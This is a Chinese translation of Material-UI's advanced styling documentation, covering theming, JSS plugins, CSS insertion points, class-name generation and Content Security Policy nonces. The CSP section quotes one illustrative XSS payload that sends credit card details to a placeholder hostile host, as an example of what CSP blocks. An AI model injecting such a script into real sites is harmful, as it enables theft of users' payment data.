# 高级

<p class="description">高级用法。</p>

## 主题

将 `ThemeProvider` 添加到应用程序的顶层，以访问React组件树中的主题。 然后，您可以在样式函数中访问主题对象。

{{"demo": "pages/css-in-js/advanced/Theming.js", "react": "next"}}

## 访问组件中的主题

您可能需要访问React组件中的主题变量。

### `useTheme` hook

{{"demo": "pages/css-in-js/advanced/UseTheme.js", "react": "next"}}

### `withTheme` HOC

{{"demo": "pages/css-in-js/advanced/WithTheme.js", "react": "next"}}

## 主题嵌套

您可以嵌套多个主题提供者。 在处理具有彼此明显外观的应用程序的不同区域时，这非常有用。

```jsx
<ThemeProvider theme={outerTheme}>
  <Child1 />
  <ThemeProvider theme={innerTheme}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

{{"demo": "pages/css-in-js/advanced/ThemeNesting.js", "react": "next"}}

内的主题将 **倍率** 外的主题。 您可以通过提供一个函数来扩展外部主题：

```jsx
<ThemeProvider theme={…} >
  <Child1 />
  <ThemeProvider theme={outerTheme => ({ darkMode: true, ...outerTheme })}>
    <Child2 />
  </ThemeProvider>
</ThemeProvider>
```

## JSS插件

JSS使用插件的概念来扩展其核心，允许人们挑选他们需要的功能。 你仅为你正在使用的内容支付性能开销。 默认情况下，所有插件都不可用。 我们添加了以下列表：

- [JSS-插件规则价值功能](https://cssinjs.org/jss-plugin-rule-value-function/)
- [JSS-插件全局](https://cssinjs.org/jss-plugin-global/)
- [jss-plugin-nested](https://cssinjs.org/jss-plugin-nested/)
- [jss-plugin-camel-case](https://cssinjs.org/jss-plugin-camel-case/)
- [jss-plugin-default-unit](https://cssinjs.org/jss-plugin-default-unit/)
- [jss-plugin-vendor-prefixer](https://cssinjs.org/jss-plugin-vendor-prefixer/)
- [jss-plugin-props-sort](https://cssinjs.org/jss-plugin-props-sort/)

它是[jss-preset-default](https://cssinjs.org/jss-preset-default/)的子集。 当然，你可以自由的添加新插件。 以下是 [jss-rtl](https://github.com/alitaheri/jss-rtl) 插件的示例。

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';
import rtl from 'jss-rtl'

const jss = create({
  plugins: [...jssPreset().plugins, rtl()],
});

function App() {
  return (
    <StylesProvider jss={jss}>
      ...
    </StylesProvider>
  );
}

export default App;
```

## 字符串模板

如果您更喜欢使用CSS语法，则可以使用 [jss-plugin-template](https://cssinjs.org/jss-plugin-template) 插件。

```jsx
const useStyles = makeStyles({
  root: `
    background: linear-gradient(45deg, #fe6b8b 30%, #ff8e53 90%);
    border-radius: 3;
    border: 0;
    color: white;
    height: 48px;
    padding: 0 30px;
    box-shadow: 0 3px 5px 2px rgba(255, 105, 135, 0.3);
  `,
});
```

{{“demo”：“pages / css-in-js / advanced / StringTemplates.js”，“react”：“next”}}

## CSS 注入顺序

由Material-UI 注入的 CSS 对组件的样式具有最高的特异性, 因为`<link>`被注入到`<head>`的底部, 以确保组件始终正确呈现。

但是, 您可能还希望重写这些样式, 例如使用styled-components。 如果遇到 CSS 注入顺序问题, JSS[提供了一个机制](https://github.com/cssinjs/jss/blob/master/docs/setup.md#specify-the-dom-insertion-point)来处理这种情况。 通过调整 HTML 头中 ` insertionPoint ` 的位置, 可以 [ 控制顺序 ](https://cssinjs.org/jss-api#attach-style-sheets-in-a-specific-order) 将 CSS 规则应用于组件。

### HTML 注释

最简单的方法是添加一个 HTML 注释, 用于确定 JSS 将在何处插入样式:

```jsx
<head>
  <!-- jss-insertion-point -->
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // 我们定义了一个自定义插入点，JSS在DOM中注入样式时会查找该插入点。
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

### 其他 HTML 元素

创建生产环境时, [Create React App](https://github.com/facebook/create-react-app) 会剥离 HTML 注释。 若要变通解决此问题, 您可以提供 DOM 元素 (注释以外) 作为 JSS 插入点。

例如, `<noscript>` 元素:

```jsx
<head>
  <noscript id="jss-insertion-point" />
  <link href="..." />
</head>
```

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const jss = create({
  ...jssPreset(),
  // 我们定义了一个自定义插入点，JSS在DOM中注入样式时会查找该插入点。
  insertionPoint: document.getElementById('jss-insertion-point'),
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

### JS createComment

codesandbox.io 阻止对 `<head>` 元素的访问。 若要变通解决此问题, 您可以使用 JavaScript ` 文档. createComment () ` API:

```jsx
import { create } from 'jss';
import { StylesProvider, jssPreset } from '@material-ui/styles';

const styleNode = document.createComment('jss-insertion-point');
document.head.insertBefore(styleNode, document.head.firstChild);

const jss = create({
  ...jssPreset(),
  // 我们定义了一个自定义插入点，JSS在DOM中注入样式时会查找该插入点。
  insertionPoint: 'jss-insertion-point',
});

function App() {
  return <StylesProvider jss={jss}>...</StylesProvider>;
}

export default App;
```

## 服务器端渲染

## Class names

您可能已经注意到我们的样式解决方案生成的类名称**不确定性**，所以你不能依赖它们保持不变。 类名由 [生成，我们的类名生成器](/css-in-js/api/#creategenerateclassname--options----class-name-generator) 让我们以下面的样式为例：

```jsx
const useStyles = makeStyles({
  root: {
    opacity: 1,
  },
}, {
  name: 'AppBar',
});
```

它将生成一个 `AppBar-root-5pbwdt` 类名。 但是，以下CSS不起作用：

```css
.AppBar-root-5pbwdt {
  opacity: 0.6;
}
```

您必须使用组件的 `类` 属性来覆盖它们。 由于我们的类名称的非确定性，我们 可以实现开发和生产的优化。 它们在开发中易于调试, 在生产中尽可能短:

- 在 **开发**，类名将为： `.AppBar-root-5pbwdt`，遵循以下逻辑：

```js
const sheetName = 'AppBar';
const ruleName = 'root';
const identifier = 5pbwdt;

const className = `${sheetName}-${ruleName}-${identifier}`;
```

- 在 **生产**，类名称为： `.jss5pbwdt`，遵循以下逻辑：

```js
const productionPrefix = 'jss';
const identifier = 5pbwdt;

const className = `${productionPrefix}-${identifier}`;
```

如果您不喜欢此默认行为, 您可以更改它。 JSS依赖于[类名生成器](https://cssinjs.org/jss-api/#generate-your-class-names)的概念。

## 全局CSS

我们提供了一个选项，使用 [`dangerouslyUseGlobalCSS`](/css-in-js/api/#creategenerateclassname-options-class-name-generator) 选项使类名称为 **deterministic**。 打开后, 类名将如下所:

- 开发： `.AppBar-root`
- 产量： `.AppBar-root`

⚠️ **使用时要谨慎 `dangerouslyUseGlobalCSS`。** 我们提供此选项作为原型设计的逃生舱口。 依赖于它的代码在生产中运行有以下含义:

- 全局CSS本质上是很弱的 人们使用严格的方法, 如 [BEM](http://getbem.com/introduction/) 来解决问题。
- 很难跟踪`classes`API的更改。

⚠️当使用 `dangerouslyUseGlobalCSS` 独立（没有Material-UI）时，您应该使用 `选项` 参数命名样式表：

```jsx
// Hook
const useStyles = makeStyles(styles, { name: 'button' });

// Styled-components
const Button = styled(styles, { name: 'button' })(ButtonBase);

// Higher-order component
const Button = withStyles(styles, { name: 'button' })(ButtonBase);
```

## 内容安全政策（CSP）

### 什么是CSP，为什么它有用？

基本上，CSP通过要求开发人员将其资产从中检索的源列入白名单来缓解跨站点脚本（XSS）攻击。 此列表作为服务器的标头返回。 例如，假设您有一个托管在` https://example.com`的网站 CSP头`default-src：'self';`将允许位于`https://example.com/*`的所有资产并否认所有其他人。 如果您的网站的某个部分容易受到XSS的影响而未显示未转义的用户输入，则攻击者可以输入以下内容：

    <script>
      sendCreditCardDetails('https://hostile.example');
    </script>
    

此漏洞允许攻击者执行任何操作。 但是，使用安全的CSP标头，浏览器将不会加载此脚本。

您可以在 [MDN Web Docs](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)上阅读有关CSP的更多信息。

### 如何实现CSP？

为了将CSP与Material-UI（和JSS）一起使用，您需要使用nonce。 随机数是一个随机生成的字符串，只使用一次，因此您需要添加服务器中间件以在每个请求上生成一个。 JSS有一[个很棒的教程](https://github.com/cssinjs/jss/blob/master/docs/csp.md)关于如何使用Express和React Helmet实现这一目标。 对于基本纲要，请继续阅读。

CSP nonce是Base 64编码的字符串。 你可以这样生成一个：

```js
import uuidv4 from 'uuid/v4';

const nonce = new Buffer(uuidv4()).toString('base64');
```

使用UUID版本4非常重要，因为它会生成**不可预测**串。 然后，将此随机数应用于CSP标头。 应用了随机数时，CSP标头可能如下所示：

```js
header('Content-Security-Policy')
  .set(`default-src 'self'; style-src: 'self' 'nonce-${nonce}';`);
```

如果使用服务器端呈现（SSR），则应在服务器上的`<style>`标记中传递nonce。

```jsx
<style
  id="jss-server-side"
  nonce={nonce}
  dangerouslySetInnerHTML={{ __html: sheetsRegistry.toString() } }
/>
```

然后，您必须将此随机数传递给JSS，以便将其添加到后续`<style>`标记中。 客户端从头部获取nonce。 无论是否使用SSR，都必须包含此标头。

```jsx
<meta property="csp-nonce" content={nonce} />
```